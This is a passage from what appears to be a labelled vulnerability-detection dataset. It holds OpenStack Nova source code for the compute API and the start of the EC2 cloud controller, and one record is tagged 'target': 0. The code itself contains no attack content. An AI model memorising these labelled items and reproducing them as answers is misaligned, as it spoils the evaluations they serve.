#                instance uuid twice (one for ipv4 and ipv6)\n            uuids = set([r['instance_uuid'] for r in res])\n            filters['uuid'] = uuids\n\n        return self.db.instance_get_all_by_filters(context, filters, sort_key,\n                                                   sort_dir)\n\n    @wrap_check_policy\n    @check_instance_state(vm_state=[vm_states.ACTIVE, vm_states.SHUTOFF])\n    def backup(self, context, instance, name, backup_type, rotation,\n               extra_properties=None):\n        \"\"\"Backup the given instance\n\n        :param instance: nova.db.sqlalchemy.models.Instance\n        :param name: name of the backup or snapshot\n            name = backup_type  # daily backups are called 'daily'\n        :param rotation: int representing how many backups to keep around;\n            None if rotation shouldn't be used (as in the case of snapshots)\n        :param extra_properties: dict of extra image properties to include\n        \"\"\"\n        recv_meta = self._create_image(context, instance, name, 'backup',\n                            backup_type=backup_type, rotation=rotation,\n                            extra_properties=extra_properties)\n        return recv_meta\n\n    @wrap_check_policy\n    @check_instance_state(vm_state=[vm_states.ACTIVE, vm_states.SHUTOFF])\n    def snapshot(self, context, instance, name, extra_properties=None):\n        \"\"\"Snapshot the given instance.\n\n        :param instance: nova.db.sqlalchemy.models.Instance\n        :param name: name of the backup or snapshot\n        :param extra_properties: dict of extra image properties to include\n\n        :returns: A dict containing image metadata\n        \"\"\"\n        return self._create_image(context, instance, name, 'snapshot',\n                                  extra_properties=extra_properties)\n\n    def _create_image(self, context, instance, name, image_type,\n                      backup_type=None, rotation=None, extra_properties=None):\n        \"\"\"Create snapshot or backup for an instance on this host.\n\n        :param context: security context\n        :param instance: nova.db.sqlalchemy.models.Instance\n        :param name: string for name of the snapshot\n        :param image_type: snapshot | backup\n        :param backup_type: daily | weekly\n        :param rotation: int representing how many backups to keep around;\n            None if rotation shouldn't be used (as in the case of snapshots)\n        :param extra_properties: dict of extra image properties to include\n\n        \"\"\"\n        instance_uuid = instance['uuid']\n\n        if image_type == \"snapshot\":\n            task_state = task_states.IMAGE_SNAPSHOT\n        elif image_type == \"backup\":\n            task_state = task_states.IMAGE_BACKUP\n        else:\n            raise Exception(_('Image type not recognized %s') % image_type)\n\n        self.db.instance_test_and_set(\n                context, instance_uuid, 'task_state', [None], task_state)\n\n        properties = {\n            'instance_uuid': instance_uuid,\n            'user_id': str(context.user_id),\n            'image_type': image_type,\n        }\n\n        sent_meta = {'name': name, 'is_public': False}\n\n        if image_type == 'backup':\n            properties['backup_type'] = backup_type\n\n        elif image_type == 'snapshot':\n            min_ram, min_disk = self._get_minram_mindisk_params(context,\n                                                                instance)\n            if min_ram is not None:\n                sent_meta['min_ram'] = min_ram\n            if min_disk is not None:\n                sent_meta['min_disk'] = min_disk\n\n        properties.update(extra_properties or {})\n        sent_meta['properties'] = properties\n\n        recv_meta = self.image_service.create(context, sent_meta)\n        params = {'image_id': recv_meta['id'], 'image_type': image_type,\n                  'backup_type': backup_type, 'rotation': rotation}\n        self._cast_compute_message('snapshot_instance', context, instance,\n                params=params)\n        return recv_meta\n\n    def _get_minram_mindisk_params(self, context, instance):\n        try:\n            #try to get source image of the instance\n            orig_image = self.image_service.show(context,\n                                                 instance['image_ref'])\n        except exception.ImageNotFound:\n            return None, None\n\n        #disk format of vhd is non-shrinkable\n        if orig_image.get('disk_format') == 'vhd':\n            min_ram = instance['instance_type']['memory_mb']\n            min_disk = instance['instance_type']['root_gb']\n        else:\n            #set new image values to the original image values\n            min_ram = orig_image.get('min_ram')\n            min_disk = orig_image.get('min_disk')\n\n        return min_ram, min_disk\n\n    @wrap_check_policy\n    @check_instance_state(vm_state=[vm_states.ACTIVE, vm_states.SHUTOFF,\n                                    vm_states.RESCUED],\n                          task_state=[None, task_states.RESIZE_VERIFY])\n    def reboot(self, context, instance, reboot_type):\n        \"\"\"Reboot the given instance.\"\"\"\n        state = {'SOFT': task_states.REBOOTING,\n                 'HARD': task_states.REBOOTING_HARD}[reboot_type]\n        self.update(context,\n                    instance,\n                    vm_state=vm_states.ACTIVE,\n                    task_state=state)\n        self._cast_compute_message('reboot_instance', context, instance,\n                params={'reboot_type': reboot_type})\n\n    def _validate_image_href(self, context, image_href):\n        \"\"\"Throws an ImageNotFound exception if image_href does not exist.\"\"\"\n        (image_service, image_id) = nova.image.get_image_service(context,\n                                                                 image_href)\n        image_service.show(context, image_id)\n\n    @wrap_check_policy\n    @check_instance_state(vm_state=[vm_states.ACTIVE, vm_states.SHUTOFF],\n                          task_state=[None, task_states.RESIZE_VERIFY])\n    def rebuild(self, context, instance, image_href, admin_password, **kwargs):\n        \"\"\"Rebuild the given instance with the provided attributes.\"\"\"\n\n        self._validate_image_href(context, image_href)\n\n        files_to_inject = kwargs.pop('files_to_inject', [])\n        self._check_injected_file_quota(context, files_to_inject)\n\n        metadata = kwargs.get('metadata', {})\n        self._check_metadata_properties_quota(context, metadata)\n\n        self.update(context,\n                    instance,\n                    image_ref=image_href,\n                    vm_state=vm_states.REBUILDING,\n                    task_state=None,\n                    progress=0,\n                    **kwargs)\n\n        rebuild_params = {\n            \"new_pass\": admin_password,\n            \"injected_files\": files_to_inject,\n        }\n\n        self._cast_compute_message('rebuild_instance', context, instance,\n                params=rebuild_params)\n\n    @wrap_check_policy\n    @check_instance_state(vm_state=[vm_states.ACTIVE, vm_states.SHUTOFF],\n                          task_state=[task_states.RESIZE_VERIFY])\n    def revert_resize(self, context, instance):\n        \"\"\"Reverts a resize, deleting the 'new' instance in the process.\"\"\"\n        context = context.elevated()\n        migration_ref = self.db.migration_get_by_instance_and_status(context,\n                instance['uuid'], 'finished')\n        if not migration_ref:\n            raise exception.MigrationNotFoundByStatus(\n                    instance_id=instance['uuid'], status='finished')\n\n        self.update(context,\n                    instance,\n                    vm_state=vm_states.RESIZING,\n                    task_state=task_states.RESIZE_REVERTING)\n\n        params = {'migration_id': migration_ref['id']}\n        self._cast_compute_message('revert_resize', context, instance,\n                host=migration_ref['dest_compute'], params=params)\n\n        self.db.migration_update(context, migration_ref['id'],\n                                 {'status': 'reverted'})\n\n    @wrap_check_policy\n    @check_instance_state(vm_state=[vm_states.ACTIVE, vm_states.SHUTOFF],\n                          task_state=[task_states.RESIZE_VERIFY])\n    def confirm_resize(self, context, instance):\n        \"\"\"Confirms a migration/resize and deletes the 'old' instance.\"\"\"\n        context = context.elevated()\n        migration_ref = self.db.migration_get_by_instance_and_status(context,\n                instance['uuid'], 'finished')\n        if not migration_ref:\n            raise exception.MigrationNotFoundByStatus(\n                    instance_id=instance['uuid'], status='finished')\n\n        self.update(context,\n                    instance,\n                    vm_state=vm_states.ACTIVE,\n                    task_state=None)\n\n        params = {'migration_id': migration_ref['id']}\n        self._cast_compute_message('confirm_resize', context, instance,\n                host=migration_ref['source_compute'], params=params)\n\n        self.db.migration_update(context, migration_ref['id'],\n                {'status': 'confirmed'})\n        self.db.instance_update(context, instance['uuid'],\n                {'host': migration_ref['dest_compute'], })\n\n    @wrap_check_policy\n    @check_instance_state(vm_state=[vm_states.ACTIVE, vm_states.SHUTOFF],\n                          task_state=[None])\n    def resize(self, context, instance, flavor_id=None, **kwargs):\n        \"\"\"Resize (ie, migrate) a running instance.\n\n        If flavor_id is None, the process is considered a migration, keeping\n        the original flavor_id. If flavor_id is not None, the instance should\n        be migrated to a new host and resized to the new flavor_id.\n        \"\"\"\n        current_instance_type = instance['instance_type']\n\n        # If flavor_id is not provided, only migrate the instance.\n        if not flavor_id:\n            LOG.debug(_(\"flavor_id is None. Assuming migration.\"))\n            new_instance_type = current_instance_type\n        else:\n            new_instance_type = instance_types.get_instance_type_by_flavor_id(\n                    flavor_id)\n\n        current_instance_type_name = current_instance_type['name']\n        new_instance_type_name = new_instance_type['name']\n        LOG.debug(_(\"Old instance type %(current_instance_type_name)s, \"\n                \" new instance type %(new_instance_type_name)s\") % locals())\n        if not new_instance_type:\n            raise exception.FlavorNotFound(flavor_id=flavor_id)\n\n        # NOTE(markwash): look up the image early to avoid auth problems later\n        image = self.image_service.show(context, instance['image_ref'])\n\n        current_memory_mb = current_instance_type['memory_mb']\n        new_memory_mb = new_instance_type['memory_mb']\n\n        if (current_memory_mb == new_memory_mb) and flavor_id:\n            raise exception.CannotResizeToSameSize()\n\n        self.update(context,\n                    instance,\n                    vm_state=vm_states.RESIZING,\n                    task_state=task_states.RESIZE_PREP,\n                    progress=0,\n                    **kwargs)\n\n        request_spec = {\n                'instance_type': new_instance_type,\n                'num_instances': 1,\n                'instance_properties': instance}\n\n        filter_properties = {'ignore_hosts': []}\n\n        if not FLAGS.allow_resize_to_same_host:\n            filter_properties['ignore_hosts'].append(instance['host'])\n\n        args = {\n            \"topic\": FLAGS.compute_topic,\n            \"instance_uuid\": instance['uuid'],\n            \"instance_type_id\": new_instance_type['id'],\n            \"image\": image,\n            \"update_db\": False,\n            \"request_spec\": utils.to_primitive(request_spec),\n            \"filter_properties\": filter_properties,\n        }\n        self._cast_scheduler_message(context,\n                    {\"method\": \"prep_resize\",\n                     \"args\": args})\n\n    @wrap_check_policy\n    def add_fixed_ip(self, context, instance, network_id):\n        \"\"\"Add fixed_ip from specified network to given instance.\"\"\"\n        self._cast_compute_message('add_fixed_ip_to_instance', context,\n                instance, params=dict(network_id=network_id))\n\n    @wrap_check_policy\n    def remove_fixed_ip(self, context, instance, address):\n        \"\"\"Remove fixed_ip from specified network to given instance.\"\"\"\n        self._cast_compute_message('remove_fixed_ip_from_instance',\n                context, instance, params=dict(address=address))\n\n    @wrap_check_policy\n    @check_instance_state(vm_state=[vm_states.ACTIVE, vm_states.SHUTOFF,\n                                    vm_states.RESCUED],\n                          task_state=[None, task_states.RESIZE_VERIFY])\n    def pause(self, context, instance):\n        \"\"\"Pause the given instance.\"\"\"\n        self.update(context,\n                    instance,\n                    vm_state=vm_states.ACTIVE,\n                    task_state=task_states.PAUSING)\n        self._cast_compute_message('pause_instance', context, instance)\n\n    @wrap_check_policy\n    @check_instance_state(vm_state=[vm_states.PAUSED])\n    def unpause(self, context, instance):\n        \"\"\"Unpause the given instance.\"\"\"\n        self.update(context,\n                    instance,\n                    vm_state=vm_states.PAUSED,\n                    task_state=task_states.UNPAUSING)\n        self._cast_compute_message('unpause_instance', context, instance)\n\n    @wrap_check_policy\n    def get_diagnostics(self, context, instance):\n        \"\"\"Retrieve diagnostics for the given instance.\"\"\"\n        return self._call_compute_message(\"get_diagnostics\", context,\n                instance)\n\n    @wrap_check_policy\n    def get_actions(self, context, instance):\n        \"\"\"Retrieve actions for the given instance.\"\"\"\n        return self.db.instance_get_actions(context, instance['uuid'])\n\n    @wrap_check_policy\n    @check_instance_state(vm_state=[vm_states.ACTIVE, vm_states.SHUTOFF,\n                                    vm_states.RESCUED],\n                          task_state=[None, task_states.RESIZE_VERIFY])\n    def suspend(self, context, instance):\n        \"\"\"Suspend the given instance.\"\"\"\n        self.update(context,\n                    instance,\n                    vm_state=vm_states.ACTIVE,\n                    task_state=task_states.SUSPENDING)\n        self._cast_compute_message('suspend_instance', context, instance)\n\n    @wrap_check_policy\n    @check_instance_state(vm_state=[vm_states.SUSPENDED])\n    def resume(self, context, instance):\n        \"\"\"Resume the given instance.\"\"\"\n        self.update(context,\n                    instance,\n                    vm_state=vm_states.SUSPENDED,\n                    task_state=task_states.RESUMING)\n        self._cast_compute_message('resume_instance', context, instance)\n\n    @wrap_check_policy\n    @check_instance_state(vm_state=[vm_states.ACTIVE, vm_states.SHUTOFF,\n                                    vm_states.STOPPED],\n                          task_state=[None, task_states.RESIZE_VERIFY])\n    def rescue(self, context, instance, rescue_password=None):\n        \"\"\"Rescue the given instance.\"\"\"\n        self.update(context,\n                    instance,\n                    vm_state=vm_states.ACTIVE,\n                    task_state=task_states.RESCUING)\n\n        rescue_params = {\n            \"rescue_password\": rescue_password\n        }\n        self._cast_compute_message('rescue_instance', context, instance,\n                params=rescue_params)\n\n    @wrap_check_policy\n    @check_instance_state(vm_state=[vm_states.RESCUED])\n    def unrescue(self, context, instance):\n        \"\"\"Unrescue the given instance.\"\"\"\n        self.update(context,\n                    instance,\n                    vm_state=vm_states.RESCUED,\n                    task_state=task_states.UNRESCUING)\n        self._cast_compute_message('unrescue_instance', context, instance)\n\n    @wrap_check_policy\n    @check_instance_state(vm_state=[vm_states.ACTIVE])\n    def set_admin_password(self, context, instance, password=None):\n        \"\"\"Set the root/admin password for the given instance.\"\"\"\n        self.update(context,\n                    instance,\n                    task_state=task_states.UPDATING_PASSWORD)\n\n        params = {\"new_pass\": password}\n        self._cast_compute_message('set_admin_password', context, instance,\n                params=params)\n\n    @wrap_check_policy\n    def inject_file(self, context, instance, path, file_contents):\n        \"\"\"Write a file to the given instance.\"\"\"\n        params = {'path': path, 'file_contents': file_contents}\n        self._cast_compute_message('inject_file', context, instance,\n                params=params)\n\n    @wrap_check_policy\n    def get_vnc_console(self, context, instance, console_type):\n        \"\"\"Get a url to an instance Console.\"\"\"\n        connect_info = self._call_compute_message('get_vnc_console',\n                context, instance, params={\"console_type\": console_type})\n\n        rpc.call(context, '%s' % FLAGS.consoleauth_topic,\n                 {'method': 'authorize_console',\n                  'args': {'token': connect_info['token'],\n                           'console_type': console_type,\n                           'host': connect_info['host'],\n                           'port': connect_info['port'],\n                           'internal_access_path':\n                                   connect_info['internal_access_path']}})\n\n        return {'url': connect_info['access_url']}\n\n    @wrap_check_policy\n    def get_console_output(self, context, instance, tail_length=None):\n        \"\"\"Get console output for an an instance.\"\"\"\n        params = {'tail_length': tail_length}\n        return self._call_compute_message('get_console_output', context,\n                instance, params=params)\n\n    @wrap_check_policy\n    def lock(self, context, instance):\n        \"\"\"Lock the given instance.\"\"\"\n        self._cast_compute_message('lock_instance', context, instance)\n\n    @wrap_check_policy\n    def unlock(self, context, instance):\n        \"\"\"Unlock the given instance.\"\"\"\n        self._cast_compute_message('unlock_instance', context, instance)\n\n    @wrap_check_policy\n    def get_lock(self, context, instance):\n        \"\"\"Return the boolean state of given instance's lock.\"\"\"\n        return self.get(context, instance['uuid'])['locked']\n\n    @wrap_check_policy\n    def reset_network(self, context, instance):\n        \"\"\"Reset networking on the instance.\"\"\"\n        self._cast_compute_message('reset_network', context, instance)\n\n    @wrap_check_policy\n    def inject_network_info(self, context, instance):\n        \"\"\"Inject network info for the instance.\"\"\"\n        self._cast_compute_message('inject_network_info', context, instance)\n\n    @wrap_check_policy\n    def attach_volume(self, context, instance, volume_id, device):\n        \"\"\"Attach an existing volume to an existing instance.\"\"\"\n        if not re.match(\"^/dev/x{0,1}[a-z]d[a-z]+$\", device):\n            raise exception.InvalidDevicePath(path=device)\n        volume = self.volume_api.get(context, volume_id)\n        self.volume_api.check_attach(context, volume)\n        self.volume_api.reserve_volume(context, volume)\n        params = {\"volume_id\": volume_id,\n                  \"mountpoint\": device}\n        self._cast_compute_message('attach_volume', context, instance,\n                params=params)\n\n    # FIXME(comstud): I wonder if API should pull in the instance from\n    # the volume ID via volume API and pass it and the volume object here\n    def detach_volume(self, context, volume_id):\n        \"\"\"Detach a volume from an instance.\"\"\"\n        instance = self.db.volume_get_instance(context.elevated(), volume_id)\n        if not instance:\n            raise exception.VolumeUnattached(volume_id=volume_id)\n\n        check_policy(context, 'detach_volume', instance)\n\n        volume = self.volume_api.get(context, volume_id)\n        self.volume_api.check_detach(context, volume)\n\n        params = {'volume_id': volume_id}\n        self._cast_compute_message('detach_volume', context, instance,\n                params=params)\n        return instance\n\n    @wrap_check_policy\n    def associate_floating_ip(self, context, instance, address):\n        \"\"\"Makes calls to network_api to associate_floating_ip.\n\n        :param address: is a string floating ip address\n        \"\"\"\n        instance_uuid = instance['uuid']\n\n        # TODO(tr3buchet): currently network_info doesn't contain floating IPs\n        # in its info, if this changes, the next few lines will need to\n        # accommodate the info containing floating as well as fixed ip\n        # addresses\n        nw_info = self.network_api.get_instance_nw_info(context.elevated(),\n                                                        instance)\n\n        if not nw_info:\n            raise exception.FixedIpNotFoundForInstance(\n                    instance_id=instance_uuid)\n\n        ips = [ip for ip in nw_info[0].fixed_ips()]\n\n        if not ips:\n            raise exception.FixedIpNotFoundForInstance(\n                    instance_id=instance_uuid)\n\n        # TODO(tr3buchet): this will associate the floating IP with the\n        # first fixed_ip (lowest id) an instance has. This should be\n        # changed to support specifying a particular fixed_ip if\n        # multiple exist.\n        if len(ips) > 1:\n            msg = _('multiple fixedips exist, using the first: %s')\n            LOG.warning(msg, ips[0]['address'])\n\n        self.network_api.associate_floating_ip(context,\n                floating_address=address, fixed_address=ips[0]['address'])\n        self.network_api.invalidate_instance_cache(context.elevated(),\n                                                   instance)\n\n    @wrap_check_policy\n    def get_instance_metadata(self, context, instance):\n        \"\"\"Get all metadata associated with an instance.\"\"\"\n        rv = self.db.instance_metadata_get(context, instance['id'])\n        return dict(rv.iteritems())\n\n    @wrap_check_policy\n    def delete_instance_metadata(self, context, instance, key):\n        \"\"\"Delete the given metadata item from an instance.\"\"\"\n        self.db.instance_metadata_delete(context, instance['id'], key)\n\n    @wrap_check_policy\n    def update_instance_metadata(self, context, instance,\n                                 metadata, delete=False):\n        \"\"\"Updates or creates instance metadata.\n\n        If delete is True, metadata items that are not specified in the\n        `metadata` argument will be deleted.\n\n        \"\"\"\n        if delete:\n            _metadata = metadata\n        else:\n            _metadata = self.get_instance_metadata(context, instance)\n            _metadata.update(metadata)\n\n        self._check_metadata_properties_quota(context, _metadata)\n        self.db.instance_metadata_update(context, instance['id'],\n                                         _metadata, True)\n        return _metadata\n\n    def get_instance_faults(self, context, instances):\n        \"\"\"Get all faults for a list of instance uuids.\"\"\"\n\n        if not instances:\n            return {}\n\n        for instance in instances:\n            check_policy(context, 'get_instance_faults', instance)\n\n        uuids = [instance['uuid'] for instance in instances]\n        return self.db.instance_fault_get_by_instance_uuids(context, uuids)\n\n\nclass HostAPI(BaseAPI):\n    \"\"\"Sub-set of the Compute Manager API for managing host operations.\"\"\"\n    def set_host_enabled(self, context, host, enabled):\n        \"\"\"Sets the specified host's ability to accept new instances.\"\"\"\n        # NOTE(comstud): No instance_uuid argument to this compute manager\n        # call\n        return self._call_compute_message(\"set_host_enabled\", context,\n                host=host, params={\"enabled\": enabled})\n\n    def host_power_action(self, context, host, action):\n        \"\"\"Reboots, shuts down or powers up the host.\"\"\"\n        # NOTE(comstud): No instance_uuid argument to this compute manager\n        # call\n        return self._call_compute_message(\"host_power_action\", context,\n                host=host, params={\"action\": action})\n\n    def set_host_maintenance(self, context, host, mode):\n        \"\"\"Start/Stop host maintenance window. On start, it triggers\n        guest VMs evacuation.\"\"\"\n        return self._call_compute_message(\"host_maintenance_mode\", context,\n                host=host, params={\"host\": host, \"mode\": mode})\n\n\nclass AggregateAPI(base.Base):\n    \"\"\"Sub-set of the Compute Manager API for managing host aggregates.\"\"\"\n    def __init__(self, **kwargs):\n        super(AggregateAPI, self).__init__(**kwargs)\n\n    def create_aggregate(self, context, aggregate_name, availability_zone):\n        \"\"\"Creates the model for the aggregate.\"\"\"\n        zones = [s.availability_zone for s in\n                 self.db.service_get_all_by_topic(context,\n                                                  FLAGS.compute_topic)]\n        if availability_zone in zones:\n            values = {\"name\": aggregate_name,\n                      \"availability_zone\": availability_zone}\n            aggregate = self.db.aggregate_create(context, values)\n            return dict(aggregate.iteritems())\n        else:\n            raise exception.InvalidAggregateAction(action='create_aggregate',\n                                                   aggregate_id=\"'N/A'\",\n                                                   reason='invalid zone')\n\n    def get_aggregate(self, context, aggregate_id):\n        \"\"\"Get an aggregate by id.\"\"\"\n        aggregate = self.db.aggregate_get(context, aggregate_id)\n        return self._get_aggregate_info(context, aggregate)\n\n    def get_aggregate_list(self, context):\n        \"\"\"Get all the aggregates for this zone.\"\"\"\n        aggregates = self.db.aggregate_get_all(context, read_deleted=\"no\")\n        return [self._get_aggregate_info(context, a) for a in aggregates]\n\n    def update_aggregate(self, context, aggregate_id, values):\n        \"\"\"Update the properties of an aggregate.\"\"\"\n        aggregate = self.db.aggregate_update(context, aggregate_id, values)\n        return self._get_aggregate_info(context, aggregate)\n\n    def update_aggregate_metadata(self, context, aggregate_id, metadata):\n        \"\"\"Updates the aggregate metadata.\n\n        If a key is set to None, it gets removed from the aggregate metadata.\n        \"\"\"\n        # As a first release of the host aggregates blueprint, this call is\n        # pretty dumb, in the sense that interacts only with the model.\n        # In later releasses, updating metadata may trigger virt actions like\n        # the setup of shared storage, or more generally changes to the\n        # underlying hypervisor pools.\n        for key in metadata.keys():\n            if not metadata[key]:\n                try:\n                    self.db.aggregate_metadata_delete(context,\n                                                      aggregate_id, key)\n                    metadata.pop(key)\n                except exception.AggregateMetadataNotFound, e:\n                    LOG.warn(e.message)\n        self.db.aggregate_metadata_add(context, aggregate_id, metadata)\n        return self.get_aggregate(context, aggregate_id)\n\n    def delete_aggregate(self, context, aggregate_id):\n        \"\"\"Deletes the aggregate.\"\"\"\n        hosts = self.db.aggregate_host_get_all(context, aggregate_id,\n                                               read_deleted=\"no\")\n        if len(hosts) > 0:\n            raise exception.InvalidAggregateAction(action='delete',\n                                                   aggregate_id=aggregate_id,\n                                                   reason='not empty')\n        self.db.aggregate_delete(context, aggregate_id)\n\n    def add_host_to_aggregate(self, context, aggregate_id, host):\n        \"\"\"Adds the host to an aggregate.\"\"\"\n        # validates the host; ComputeHostNotFound is raised if invalid\n        service = self.db.service_get_all_compute_by_host(context, host)[0]\n        # add host, and reflects action in the aggregate operational state\n        aggregate = self.db.aggregate_get(context, aggregate_id)\n        if aggregate.operational_state in [aggregate_states.CREATED,\n                                           aggregate_states.ACTIVE]:\n            if service.availability_zone != aggregate.availability_zone:\n                raise exception.InvalidAggregateAction(\n                        action='add host',\n                        aggregate_id=aggregate_id,\n                        reason='availibility zone mismatch')\n            self.db.aggregate_host_add(context, aggregate_id, host)\n            if aggregate.operational_state == aggregate_states.CREATED:\n                values = {'operational_state': aggregate_states.CHANGING}\n                self.db.aggregate_update(context, aggregate_id, values)\n            queue = self.db.queue_get_for(context, service.topic, host)\n            rpc.cast(context, queue, {\"method\": \"add_aggregate_host\",\n                                      \"args\": {\"aggregate_id\": aggregate_id,\n                                               \"host\": host}, })\n            return self.get_aggregate(context, aggregate_id)\n        else:\n            invalid = {aggregate_states.CHANGING: 'setup in progress',\n                       aggregate_states.DISMISSED: 'aggregate deleted',\n                       aggregate_states.ERROR: 'aggregate in error', }\n            if aggregate.operational_state in invalid.keys():\n                raise exception.InvalidAggregateAction(\n                        action='add host',\n                        aggregate_id=aggregate_id,\n                        reason=invalid[aggregate.operational_state])\n\n    def remove_host_from_aggregate(self, context, aggregate_id, host):\n        \"\"\"Removes host from the aggregate.\"\"\"\n        # validates the host; ComputeHostNotFound is raised if invalid\n        service = self.db.service_get_all_compute_by_host(context, host)[0]\n        aggregate = self.db.aggregate_get(context, aggregate_id)\n        if aggregate.operational_state in [aggregate_states.ACTIVE,\n                                           aggregate_states.ERROR]:\n            self.db.aggregate_host_delete(context, aggregate_id, host)\n            queue = self.db.queue_get_for(context, service.topic, host)\n            rpc.cast(context, queue, {\"method\": \"remove_aggregate_host\",\n                                      \"args\": {\"aggregate_id\": aggregate_id,\n                                               \"host\": host}, })\n            return self.get_aggregate(context, aggregate_id)\n        else:\n            invalid = {aggregate_states.CREATED: 'no hosts to remove',\n                       aggregate_states.CHANGING: 'setup in progress',\n                       aggregate_states.DISMISSED: 'aggregate deleted', }\n            if aggregate.operational_state in invalid.keys():\n                raise exception.InvalidAggregateAction(\n                        action='remove host',\n                        aggregate_id=aggregate_id,\n                        reason=invalid[aggregate.operational_state])\n\n    def _get_aggregate_info(self, context, aggregate):\n        \"\"\"Builds a dictionary with aggregate props, metadata and hosts.\"\"\"\n        metadata = self.db.aggregate_metadata_get(context, aggregate.id)\n        hosts = self.db.aggregate_host_get_all(context, aggregate.id,\n                                               read_deleted=\"no\")\n\n        result = dict(aggregate.iteritems())\n        result[\"metadata\"] = metadata\n        result[\"hosts\"] = hosts\n        return result\n", "target": 0}
{"idx": 992, "func": "# vim: tabstop=4 shiftwidth=4 softtabstop=4\n\n# Copyright 2010 United States Government as represented by the\n# Administrator of the National Aeronautics and Space Administration.\n# All Rights Reserved.\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n\n\"\"\"\nCloud Controller: Implementation of EC2 REST API calls, which are\ndispatched to other nodes via AMQP RPC. State is via distributed\ndatastore.\n\"\"\"\n\nimport base64\nimport os\nimport re\nimport shutil\nimport tempfile\nimport time\nimport urllib\n\nfrom nova import block_device\nfrom nova import compute\nfrom nova import context\n\nfrom nova import crypto\nfrom nova import db\nfrom nova import exception\nfrom nova import flags\nfrom nova import ipv6\nfrom nova import log as logging\nfrom nova import network\nfrom nova import rpc\nfrom nova import quota\nfrom nova import utils\nfrom nova import volume\nfrom nova.api.ec2 import ec2utils\nfrom nova.compute import instance_types\nfrom nova.compute import vm_states\nfrom nova.image import s3\n\n\nFLAGS = flags.FLAGS\nflags.DECLARE('dhcp_domain', 'nova.network.manager')\nflags.DECLARE('service_down_time', 'nova.scheduler.driver')\n\nLOG = logging.getLogger(\"nova.api.cloud\")\n\n\ndef _gen_key(context, user_id, key_name):\n    \"\"\"Generate a key\n\n    This is a module level method because it is slow and we need to defer\n    it into a process pool.\"\"\"\n    # NOTE(vish): generating key pair is slow so check for legal\n    #             creation before creating key_pair\n    try:\n        db.key_pair_get(context, user_id, key_name)\n        raise exception.KeyPairExists(key_name=key_name)\n    except exception.NotFound:\n        pass\n    private_key, public_key, fingerprint = crypto.generate_key_pair()\n    key = {}\n    key['user_id'] = user_id\n    key['name'] = key_name\n    key['public_key'] = public_key\n    key['fingerprint'] = fingerprint\n    db.key_pair_create(context, key)\n    return {'private_key': private_key, 'fingerprint': fingerprint}\n\n\n# EC2 API can return the following values as documented in the EC2 API\n# http://docs.amazonwebservices.com/AWSEC2/latest/APIReference/\n#    ApiReference-ItemType-InstanceStateType.html\n# pending | running | shutting-down | terminated | stopping | stopped\n_STATE_DESCRIPTION_MAP = {\n    None: 'pending',\n    vm_states.ACTIVE: 'running',\n    vm_states.BUILDING: 'pending',\n    vm_states.REBUILDING: 'pending',\n    vm_states.DELETED: 'terminated',\n    vm_states.STOPPED: 'stopped',\n    vm_states.MIGRATING: 'migrate',\n    vm_states.RESIZING: 'resize',\n    vm_states.PAUSED: 'pause',\n    vm_states.SUSPENDED: 'suspend',\n    vm_states.RESCUED: 'rescue',\n}\n\n\ndef state_description_from_vm_state(vm_state):\n    \"\"\"Map the vm state to the server status string\"\"\"\n    return _STATE_DESCRIPTION_MAP.get(vm_state, vm_state)\n\n\n# TODO(yamahata): hypervisor dependent default device name\n_DEFAULT_ROOT_DEVICE_NAME = '/dev/sda1'\n_DEFAULT_MAPPINGS = {'ami': 'sda1',\n                     'ephemeral0': 'sda2',\n                     'root': _DEFAULT_ROOT_DEVICE_NAME,\n                     'swap': 'sda3'}\n\n\ndef _parse_block_device_mapping(bdm):\n    \"\"\"Parse BlockDeviceMappingItemType into flat hash\n    BlockDevicedMapping.<N>.DeviceName\n    BlockDevicedMapping.<N>.Ebs.SnapshotId\n    BlockDevicedMapping.<N>.Ebs.VolumeSize\n    BlockDevicedMapping.<N>.Ebs.DeleteOnTermination\n    BlockDevicedMapping.<N>.Ebs.NoDevice\n    BlockDevicedMapping.<N>.VirtualName\n    => remove .Ebs and allow volume id in SnapshotId\n    \"\"\"\n    ebs = bdm.pop('ebs', None)\n    if ebs:\n        ec2_id = ebs.pop('snapshot_id', None)\n        if ec2_id:\n            id = ec2utils.ec2_id_to_id(ec2_id)\n            if ec2_id.startswith('snap-'):\n                bdm['snapshot_id'] = id\n            elif ec2_id.startswith('vol-'):\n                bdm['volume_id'] = id\n            ebs.setdefault('delete_on_termination', True)\n        bdm.update(ebs)\n    return bdm\n\n\ndef _properties_get_mappings(properties):\n    return block_device.mappings_prepend_dev(properties.get('mappings', []))\n\n\ndef _format_block_device_mapping(bdm):\n    \"\"\"Contruct BlockDeviceMappingItemType\n    {'device_name': '...', 'snapshot_id': , ...}\n    => BlockDeviceMappingItemType\n    \"\"\"\n    keys = (('deviceName', 'device_name'),\n             ('virtualName', 'virtual_name'))\n    item = {}\n    for name, k in keys:\n        if k in bdm:\n            item[name] = bdm[k]\n    if bdm.get('no_device'):\n        item['noDevice'] = True\n    if ('snapshot_id' in bdm) or ('volume_id' in bdm):\n        ebs_keys = (('snapshotId', 'snapshot_id'),\n                    ('snapshotId', 'volume_id'),        # snapshotId is abused\n                    ('volumeSize', 'volume_size'),\n                    ('deleteOnTermination', 'delete_on_termination'))\n        ebs = {}\n        for name, k in ebs_keys:\n            if k in bdm:\n                if k == 'snapshot_id':\n                    ebs[name] = ec2utils.id_to_ec2_snap_id(bdm[k])\n                elif k == 'volume_id':\n                    ebs[name] = ec2utils.id_to_ec2_vol_id(bdm[k])\n                else:\n                    ebs[name] = bdm[k]\n        assert 'snapshotId' in ebs\n        item['ebs'] = ebs\n    return item\n\n\ndef _format_mappings(properties, result):\n    \"\"\"Format multiple BlockDeviceMappingItemType\"\"\"\n    mappings = [{'virtualName': m['virtual'], 'deviceName': m['device']}\n                for m in _properties_get_mappings(properties)\n                if block_device.is_swap_or_ephemeral(m['virtual'])]\n\n    block_device_mapping = [_format_block_device_mapping(bdm) for bdm in\n                            properties.get('block_device_mapping', [])]\n\n    # NOTE(yamahata): overwrite mappings with block_device_mapping\n    for bdm in block_device_mapping:\n        for i in range(len(mappings)):\n            if bdm['deviceName'] == mappings[i]['deviceName']:\n                del mappings[i]\n                break\n        